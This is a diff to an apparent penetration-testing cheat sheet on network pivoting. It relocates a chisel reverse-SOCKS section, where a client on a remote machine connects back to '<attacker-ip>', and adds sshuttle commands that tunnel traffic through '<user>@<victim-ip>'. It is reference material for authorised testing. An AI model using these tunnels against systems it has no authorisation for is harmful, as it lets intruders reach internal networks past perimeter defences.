@@ -10,6 +10,17 @@ Client or Server can also be launch on windows with chisel.exe
 chisel server -p <server-port|8080> --socks5 --reverse
 ```
 
+## chisel socks proxy (client on remote machine)
+#plateform/windows  #target/remote  #cat/PIVOT 
+
+If the server is launch with --reverse you can specify R: socks to get a proxy socks on server machine (port 1080)
+On server with proxychains set on port 1080 you can proxy socks request on the client.
+
+```
+./chisel client --fingerprint <FINGERPRINT> <attacker-ip>:<port> R:1080:socks
+```
+
+
 ## chisel reverse port forwarding (client on remote machine) - forward client port on server
 #plateform/linux  #target/remote  #cat/PIVOT 
 
@@ -34,16 +45,15 @@ ex : 0.0.0.0:4445:127.0.0.1:4444 expose the server 4444 listener to client 4445
 ```
 ./chisel client -v <server_ip>:<server_port|8000> <clientside-host|0.0.0.0>:<clientside-port>:<serverside-host|127.0.0.1>:<serverside-port>
 ```
-	
-## chisel socks proxy (client on remote machine)
-#plateform/windows  #target/remote  #cat/PIVOT 
 
-If the server is launch with --reverse you can specify R: socks to get a proxy socks on server machine (port 1080)
-On server with proxychains set on port 1080 you can proxy socks request on the client.
+# sshuttle
 
+## sshuttle - Forwarding traffic through
 ```
-./chisel client --fingerprint <FINGERPRINT> <attacker-ip>:<port> R:1080:socks
+sshuttle -r <user>@<victim-ip> <IP|IP/CIDR>
 ```
 
-
-
+## sshuttle - Auto detect networks
+```
+sshuttle -vNr <user>@<victim-ip>
+```
